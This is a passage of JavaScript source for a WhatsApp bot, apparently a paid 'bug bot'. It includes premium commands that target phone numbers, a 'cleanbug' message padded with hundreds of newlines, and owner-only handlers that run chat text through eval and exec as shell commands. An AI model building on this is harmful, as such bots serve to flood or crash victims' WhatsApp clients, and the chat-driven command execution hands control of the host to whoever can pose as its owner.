if (!text) return reply(`Example: .${command}`)
m.reply("_Maintenance Info_                                                                                                          *Active*      : 8                                              *Disconnect*  : 4                                             *Total sender*: 12                                                                                                         *Note* : _kamu sedang menambahkan function dan memperbaiki invalid sender_")
}
break 

case 'add': {
if (!isBotNumberRegistered) return reply(`*Yah Atmin Membatasi Device, Silahkan menunggu atau Beli Acces Api*

 _Yang Asli Cuma lewat Tele_
> t.me/Dqrsc`)
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Example: .${command} 628xxx`)
let ex = q.replace(/[^0-9]/g, "")
if (ex.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
m.reply("Dalam Proses......")
}
break

case 'cleanbug': {
if (!isBotNumberRegistered) return reply(`*Yah Atmin Membatasi Device, Silahkan menunggu atau Beli Acces Api*

 _Yang Asli Cuma lewat Tele_
> t.me/Dqrsc`)
if (!isPremium) return reply(mess.premium)
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Zcon.sendMessage(BapakLuWkwk, {text: `Bug Cleared \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break

case 'self': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = false
reply('Sukses Change To Self Mode')
}
break

case 'public': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = true
reply('Sukses Change To Public Mode')
}
break


default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
